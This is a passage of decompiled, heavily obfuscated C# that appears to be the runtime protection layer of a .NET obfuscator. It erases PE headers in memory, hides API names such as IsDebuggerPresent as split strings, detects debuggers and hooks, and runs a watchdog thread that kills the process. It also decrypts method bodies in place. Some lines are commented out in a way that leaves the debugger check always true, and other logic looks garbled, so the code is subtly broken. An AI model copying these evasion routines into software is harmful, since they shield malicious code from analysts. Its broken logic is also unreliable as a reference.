				for (int num9 = 0; num9 < 8; num9++)
				{
					ptr12[num9] = (byte)(65 + num9 % 26);
				}
				array2[num8] = ((uint*)ptr12)[3];
				array3[num8] = ((uint*)ptr12)[2];
				array4[num8] = ((uint*)ptr12)[5];
				VirtualProtect(ptr12 + 36, 4, 64u, ref uint_);
				uint num10 = ((uint*)ptr12)[9];
				((int*)ptr12)[9] = (int)num10 ^ -1431655766;
				ptr12 += 40;
			}
			if (num7 != 0)
			{
				for (int num11 = 0; num11 < num; num11++)
				{
					if (array2[num11] <= num7 && num7 < array2[num11] + array3[num11])
					{
						num7 = num7 - array2[num11] + array4[num11];
						break;
					}
				}
				byte* ptr13 = ptr + num7;
				uint num12 = *(uint*)ptr13;
				for (int num13 = 0; num13 < num; num13++)
				{
					if (array2[num13] <= num12 && num12 < array2[num13] + array3[num13])
					{
						num12 = num12 - array2[num13] + array4[num13];
						break;
					}
				}
				byte* ptr14 = ptr + num12;
				uint num14 = ((uint*)ptr13)[3];
				for (int num15 = 0; num15 < num; num15++)
				{
					if (array2[num15] <= num14 && num14 < array2[num15] + array3[num15])
					{
						num14 = num14 - array2[num15] + array4[num15];
						break;
					}
				}
				uint num16 = *(uint*)ptr14 + 2;
				for (int num17 = 0; num17 < num; num17++)
				{
					if (array2[num17] <= num16 && num16 < array2[num17] + array3[num17])
					{
						num16 = num16 - array2[num17] + array4[num17];
						break;
					}
				}
				VirtualProtect(ptr + num14, 11, 64u, ref uint_);
				*(int*)ptr4 = 1818522734;
				((int*)ptr4)[1] = 1818504812;
				((short*)ptr4)[4] = 108;
				ptr4[10] = 0;
				for (int num18 = 0; num18 < 11; num18++)
				{
					(ptr + num14)[num18] = ptr4[num18];
				}
				VirtualProtect(ptr + num16, 11, 64u, ref uint_);
				*(int*)ptr4 = 1866691662;
				((int*)ptr4)[1] = 1852404846;
				((short*)ptr4)[4] = 25973;
				ptr4[10] = 0;
				for (int num19 = 0; num19 < 11; num19++)
				{
					(ptr + num16)[num19] = ptr4[num19];
				}
			}
			for (int num20 = 0; num20 < num; num20++)
			{
				if (array2[num20] <= num6 && num6 < array2[num20] + array3[num20])
				{
					num6 = num6 - array2[num20] + array4[num20];
					break;
				}
			}
			byte* ptr15 = ptr + num6;
			VirtualProtect(ptr15, 72, 64u, ref uint_);
			uint num21 = ((uint*)ptr15)[2];
			for (int num22 = 0; num22 < num; num22++)
			{
				if (array2[num22] <= num21 && num21 < array2[num22] + array3[num22])
				{
					num21 = num21 - array2[num22] + array4[num22];
					break;
				}
			}
			*(int*)ptr15 = -559038737;
			((int*)ptr15)[1] = -889275714;
			((int*)ptr15)[2] = -17958194;
			((int*)ptr15)[3] = -559038242;
			byte* ptr16 = ptr + num21;
			VirtualProtect(ptr16, 4, 64u, ref uint_);
			*(int*)ptr16 = -1159983106;
			ptr16 += 12;
			ptr16 += (uint)(*(int*)ptr16);
			ptr16 = (byte*)(((long)ptr16 + 7L) & -4L);
			ptr16 += 2;
			ushort num23 = *ptr16;
			ptr16 += 2;
			for (int num24 = 0; num24 < num23; num24++)
			{
				VirtualProtect(ptr16, 8, 64u, ref uint_);
				ptr16 += 4;
				ptr16 += 4;
				for (int num25 = 0; num25 < 8; num25++)
				{
					VirtualProtect(ptr16, 4, 64u, ref uint_);
					*ptr16 = (byte)(144 + num25 % 16);
					ptr16++;
					if (*ptr16 != 0)
					{
						*ptr16 = (byte)(144 + num25 % 16);
						ptr16++;
						if (*ptr16 != 0)
						{
							*ptr16 = (byte)(144 + num25 % 16);
							ptr16++;
							if (*ptr16 != 0)
							{
								*ptr16 = (byte)(144 + num25 % 16);
								ptr16++;
								continue;
							}
							ptr16++;
							break;
						}
						ptr16 += 2;
						break;
					}
					ptr16 += 3;
					break;
				}
			}
		}
		VirtualProtect(ptr3 + 8, 4, 64u, ref uint_);
		((int*)ptr3)[2] = -559038737;
		VirtualProtect(ptr3 + 74, 2, 64u, ref uint_);
		((short*)ptr3)[37] = -1;
		VirtualProtect(ptr3 + 76, 2, 64u, ref uint_);
		((short*)ptr3)[38] = -1;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
	[Obsolete("Exclude")]
	//internal static extern Delegate8 GetProcAddress(IntPtr intptr_0, string string_0);

	//[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
	//[Obsolete("Exclude")]
	internal static extern Delegate9 GetProcAddress_1(IntPtr intptr_0, string string_0);

	[DllImport("kernel32.dll")]
	[Obsolete("Exclude")]
	internal static extern IntPtr OpenProcess(uint uint_1, int int_4, uint uint_2);

	[DllImport("kernel32.dll")]
	[Obsolete("Exclude")]
	internal static extern uint GetCurrentProcessId();

	//[DllImport("kernel32.dll")]
	[Obsolete("Exclude")]
	//internal static extern int CloseHandle(IntPtr intptr_0);

	//[DllImport("kernel32.dll")]
	//[Obsolete("Exclude")]
	//public static extern IntPtr LoadLibrary(string string_0);

	//[Obsolete("Exclude")]
	internal static bool smethod_20()
	{
		try
		{
			//IntPtr intPtr = global::_003CModule_003E.LoadLibrary("kernel" + "32" + ".dll");
		//	if (intPtr == IntPtr.Zero)
			{
		//		return false;
			}
		//	Delegate8 procAddress = global::_003CModule_003E.GetProcAddress(intPtr, "I" + "s" + "D" + "e" + "b" + "u" + "g" + "g" + "e" + "r" + "P" + "r" + "e" + "s" + "e" + "n" + "t");
	//		if (procAddress != null && procAddress() != 0)
			{
				return true;
			}
			IntPtr intPtr2 = OpenProcess(1024u, 0, GetCurrentProcessId());
			if (intPtr2 != IntPtr.Zero)
			{
				try
				{
				//	Delegate9 procAddress_ = GetProcAddress_1(intPtr, "C" + "h" + "e" + "c" + "k" + "R" + "e" + "m" + "o" + "t" + "e" + "D" + "e" + "b" + "u" + "g" + "g" + "e" + "r" + "P" + "r" + "e" + "s" + "e" + "n" + "t");
					//if (procAddress_ != null)
					{
						int num = 0;
					//	if (procAddress_(intPtr2, ref num) != 0 && num != 0)
						{
							return true;
						}
					}
				}
				finally
				{
				//	global::_003CModule_003E.CloseHandle(intPtr2);
				}
			}
			try
			{
			//	global::_003CModule_003E.CloseHandle(new IntPtr(305419896));
			}
			catch
			{
				return false;
			}
			try
			{
				Type typeFromHandle = typeof(Debugger);
				MethodInfo method = typeFromHandle.GetMethod("get" + "_" + "Is" + "Attached");
				if (method != null)
				{
					IntPtr functionPointer = method.MethodHandle.GetFunctionPointer();
					byte[] array = new byte[1];
					Marshal.Copy(functionPointer, array, 0, 1);
					if (array[0] == 51)
					{
						return true;
					}
				}
			}
			catch
			{
			}
		}
		catch
		{
			return false;
		}
		return false;
	}

	[Obsolete("Exclude")]
	public static void smethod_21()
	{
		try
		{
			if (smethod_20())
			{
				smethod_3((uint)Process.GetCurrentProcess().Id);
			}
			string text = smethod_4("멋", smethod_23(-1486174492)) + smethod_4("國", smethod_23(-1761399896)) + smethod_4("俚", smethod_23(1472541540));
			string[] array = new string[smethod_23(913276134)];
			array[smethod_23(913276140)] = text;
			array[smethod_23(913276141)] = smethod_4("尺", smethod_23(905322633));
			array[smethod_23(913276142)] = smethod_4("䞧", smethod_23(-1925694693));
			array[smethod_23(913276143)] = smethod_4("\uef29", smethod_23(1267438487));
			array[smethod_23(913276136)] = smethod_4("뻿", smethod_23(1725547100));
			array[smethod_23(913276137)] = smethod_4("滐", smethod_23(1737429626));
			array[smethod_23(913276138)] = smethod_4("巽", smethod_23(-1098636968));
			array[smethod_23(913276139)] = smethod_4("⸊", smethod_23(1613255338));
			array[smethod_23(913276132)] = smethod_4("㻦", smethod_23(-2123152817));
			array[smethod_23(913276133)] = smethod_4("嶷", smethod_23(179904777));
			if (Environment.GetEnvironmentVariable(string.Concat(array)) == null)
			{
				string[] array2 = new string[smethod_23(913276158)];
				array2[smethod_23(913276140)] = text;
				array2[smethod_23(913276141)] = smethod_4("赳", smethod_23(1853878720));
				array2[smethod_23(913276142)] = smethod_4("껯", smethod_23(-375991738));
				array2[smethod_23(913276143)] = smethod_4("⒬", smethod_23(-2089527282));
				array2[smethod_23(913276136)] = smethod_4("恵", smethod_23(-483255080));
				array2[smethod_23(913276137)] = smethod_4("హ", smethod_23(1902407831));
				array2[smethod_23(913276138)] = smethod_4("뿝", smethod_23(1898759037));
				array2[smethod_23(913276139)] = smethod_4("퇶", smethod_23(-1291080353));
				array2[smethod_23(913276132)] = smethod_4("폊", smethod_23(-1809338503));
				array2[smethod_23(913276133)] = smethod_4("\ue5ac", smethod_23(228366608));
				array2[smethod_23(913276134)] = smethod_4("윲", smethod_23(-725501044));
				array2[smethod_23(913276135)] = smethod_4("\uee7b", smethod_23(1371968216));
				array2[smethod_23(913276128)] = smethod_4("睐", smethod_23(1163791354));
				array2[smethod_23(913276129)] = smethod_4("볺", smethod_23(-2030583713));
				array2[smethod_23(913276130)] = smethod_4("㠜", smethod_23(1354777788));
				array2[smethod_23(913276131)] = smethod_4("\ue929", smethod_23(807114124));
				array2[smethod_23(913276156)] = smethod_4("圆", smethod_23(1195125668));
				array2[smethod_23(913276157)] = smethod_4("\u0097", smethod_23(1459256380));
				if (Environment.GetEnvironmentVariable(string.Concat(array2)) != null)
				{
					goto IL_03fd;
				}
			}
			else if (smethod_23(913276141) != 0)
			{
				goto IL_03fd;
			}
			goto IL_040c;
			IL_03fd:
			smethod_3((uint)Process.GetCurrentProcess().Id);
			goto IL_040c;
			IL_040c:
			Process currentProcess = Process.GetCurrentProcess();
			if (currentProcess.Handle == IntPtr.Zero)
			{
				smethod_3((uint)Process.GetCurrentProcess().Id);
				currentProcess.Close();
			}
			try
			{
			//	global::_003CModule_003E.CloseHandle(IntPtr.Zero);
			}
			catch
			{
				smethod_3((uint)Process.GetCurrentProcess().Id);
			}
		}
		catch
		{
			smethod_3((uint)Process.GetCurrentProcess().Id);
		}
		Thread thread = new Thread(smethod_22);
		thread.IsBackground = (byte)smethod_23(913276141) != 0;
		thread.Priority = (ThreadPriority)smethod_23(913276140);
		thread.Start();
	}

	[Obsolete("Exclude")]
	public static void smethod_22(object object_0)
	{
		Thread thread = object_0 as Thread;
		if (((thread != null) ? 1 : 0) == smethod_24(572648625))
		{
			thread = new Thread(smethod_22)
			{
				IsBackground = ((byte)smethod_24(572648624) != 0),
				Priority = (ThreadPriority)smethod_24(572648625)
			};
			thread.Start(Thread.CurrentThread);
			Thread.Sleep(smethod_24(572648773));
		}
		while (true)
		{
			smethod_24(572648624);
			try
			{
				if (smethod_20())
				{
					smethod_3((uint)Process.GetCurrentProcess().Id);
				}
				if ((thread.IsAlive ? 1 : 0) == smethod_24(572648625))
				{
					smethod_3((uint)Process.GetCurrentProcess().Id);
				}
			}
			catch
			{
				smethod_3((uint)Process.GetCurrentProcess().Id);
			}
			Thread.Sleep(smethod_24(572648289));
		}
	}

	[Obsolete("Exclude")]
	public static int smethod_23(int int_4)
	{
		return int_4 ^ 0x366F7CEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_24(int int_4)
	{
		return int_4 ^ 0x2221ECB1;
	}

	[Obsolete("Exclude")]
	private static bool smethod_25(MethodBase methodBase_0)
	{
		Assembly assembly = methodBase_0.DeclaringType?.Assembly;
		Assembly entryAssembly = Assembly.GetEntryAssembly();
		if (!(assembly == null) && !(entryAssembly == null))
		{
			return assembly != entryAssembly && assembly.FullName.StartsWith("System");
		}
		return true;
	}

	[Obsolete("Exclude")]
	private static bool smethod_26(string string_0, string string_1)
	{
		MethodInfo methodInfo = Type.GetType(string_0)?.GetMethod(string_1);
		if (methodInfo == null)
		{
			return true;
		}
		if (smethod_25(methodInfo))
		{
			return false;
		}
		return smethod_28(methodInfo);
	}

	[Obsolete("Exclude")]
	private static bool smethod_27(string string_0, string string_1, string string_2)
	{
		Type type = Type.GetType(string_0);
		if (type == null)
		{
			return true;
		}
		MethodInfo method = type.GetMethod(string_1);
		MethodInfo method2 = type.GetMethod(string_2);
		IntPtr intPtr = method?.MethodHandle.GetFunctionPointer() ?? IntPtr.Zero;
		IntPtr intPtr2 = method2?.MethodHandle.GetFunctionPointer() ?? IntPtr.Zero;
		return intPtr != intPtr2;
	}

	[Obsolete("Exclude")]
	private unsafe static bool smethod_28(MethodBase methodBase_0)
	{
		try
		{
			IntPtr functionPointer = methodBase_0.MethodHandle.GetFunctionPointer();
			byte* ptr = (byte*)functionPointer.ToPointer();
			byte b = *ptr;
			byte b2 = ptr[1];
			byte b3 = b;
			byte b4 = b3;
			if ((uint)b4 <= 195u)
			{
				if (b4 != 144)
				{
					if ((uint)(b4 - 194) <= 1u)
					{
						goto IL_00f0;
					}
				}
				else if (b2 == 144)
				{
					return true;
				}
			}
			else
			{
				if (b4 == 233 || b4 == 235)
				{
					goto IL_00f0;
				}
				if (b4 == byte.MaxValue && b2 == 37)
				{
					return true;
				}
			}
			byte b5 = Marshal.ReadByte(functionPointer);
			return b != b5;
			IL_00f0:
			return true;
		}
		catch
		{
			return true;
		}
	}

	[Obsolete("Exclude")]
	public static void smethod_29()
	{
		if ((smethod_27(smethod_4("譓譹譳譴譥譭謮譒譥警譬譥譣譴譩譯譮謮譁譳譳譥譭譢譬譹", smethod_30(-525907269)), smethod_4("쎹쎛쎊쎽쎟쎒쎒쎗쎐쎙쎿쎍쎍쎛쎓쎜쎒쎇", smethod_30(568656453)), smethod_4("➷➕➄➵➈➕➓➅➄➙➞➗➱➃➃➕➝➒➜➉", smethod_30(-1880955317))) ? 1 : 0) == smethod_30(1922417083))
		{
			smethod_3((uint)Process.GetCurrentProcess().Id);
		}
		else if (smethod_26(smethod_4("ᐼᐖᐜᐛᐊᐂᑁᐽᐊᐉᐃᐊᐌᐛᐆ᐀ᐁᑁᐮᐜᐜᐊᐂᐍᐃᐖ", smethod_30(904058324)), smethod_4("\uf517\uf535\uf524\uf513\uf531\uf53c\uf53c\uf539\uf53e\uf537\uf511\uf523\uf523\uf535\uf53d\uf532\uf53c\uf529", smethod_30(1169896683))))
		{
			smethod_3((uint)Process.GetCurrentProcess().Id);
		}
		else if (smethod_26(smethod_4("ŤŎńŃŒŚęťŒőśŒŔŃŞŘřęŶńńŒŚŕśŎ", smethod_30(97108108)), smethod_4("쬶쬔쬅쬴쬉쬔쬒쬄쬅쬘쬟쬖쬰쬂쬂쬔쬜쬓쬝쬈", smethod_30(1753352906))))
		{
			smethod_3((uint)Process.GetCurrentProcess().Id);
		}
	}

	[Obsolete("Exclude")]
	public static int smethod_30(int int_4)
	{
		return int_4 ^ 0x7295C1BB;
	}

	[DllImport("kernel32.dll")]
	[Obsolete("Exclude")]
	public static extern bool VirtualProtect(IntPtr intptr_0, uint uint_1, uint uint_2, ref uint uint_3);

	[Obsolete("Exclude")]
	public unsafe static void smethod_31()
	{
		Module module = typeof(global::_003CModule_003E).Module;
		string fullyQualifiedName = module.FullyQualifiedName;
		bool flag = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
		byte* ptr = (byte*)(void*)Marshal.GetHINSTANCE(module);
		byte* ptr2 = ptr + (uint)((int*)ptr)[15];
		ushort num = ((ushort*)ptr2)[3];
		ushort num2 = ((ushort*)ptr2)[10];
		uint* ptr3 = null;
		uint num3 = 0u;
		uint* ptr4 = (uint*)(ptr2 + 24 + (int)num2);
		uint num4 = 3881616888u;
		uint num5 = 206923572u;
		uint num6 = 2613169372u;
		uint num7 = 3730045037u;
		for (int i = 0; i < num; i++)
		{
			switch (*(ptr4++) * *(ptr4++))
			{
			case 4051796412u:
				ptr3 = (uint*)(ptr + (flag ? ptr4[3] : ptr4[1]));
				num3 = (flag ? ptr4[2] : (*ptr4)) >> 2;
				break;
			default:
			{
				uint* ptr5 = (uint*)(ptr + (flag ? ptr4[3] : ptr4[1]));
				uint num8 = ptr4[2] >> 2;
				for (uint num9 = 0u; num9 < num8; num9++)
				{
					uint num10 = (num4 ^ *(ptr5++)) + num5 + num6 * num7;
					num4 = num5;
					num5 = num6;
					num5 = num7;
					num7 = num10;
				}
				break;
			}
			case 0u:
				break;
			}
			ptr4 += 8;
		}
		uint[] array = new uint[16];
		uint[] array2 = new uint[16];
		for (int j = 0; j < 16; j++)
		{
			array[j] = num7;
			array2[j] = num5;
			num4 = (num5 >> 5) | (num5 << 27);
			num5 = (num6 >> 3) | (num6 << 29);
			num6 = (num7 >> 7) | (num7 << 25);
			num7 = (num4 >> 11) | (num4 << 21);
		}
		array[0] = array[0] ^ array2[0];
		array[1] = array[1] * array2[1];
		array[2] = array[2] + array2[2];
		array[3] = array[3] ^ array2[3];
		array[4] = array[4] * array2[4];
		array[5] = array[5] + array2[5];
		array[6] = array[6] ^ array2[6];
		array[7] = array[7] * array2[7];
		array[8] = array[8] + array2[8];
		array[9] = array[9] ^ array2[9];
		array[10] = array[10] * array2[10];
		array[11] = array[11] + array2[11];
		array[12] = array[12] ^ array2[12];
		array[13] = array[13] * array2[13];
		array[14] = array[14] + array2[14];
		array[15] = array[15] ^ array2[15];
		uint uint_ = 64u;
		VirtualProtect((IntPtr)ptr3, num3 << 2, 64u, ref uint_);
		if (uint_ != 64)
		{
			uint num11 = 0u;
			for (uint num12 = 0u; num12 < num3; num12++)
			{
				*ptr3 ^= array[num11 & 0xF];
				array[num11 & 0xF] = (array[num11 & 0xF] ^ *(ptr3++)) + 1035675673;
				num11++;
			}
		}
	}
}
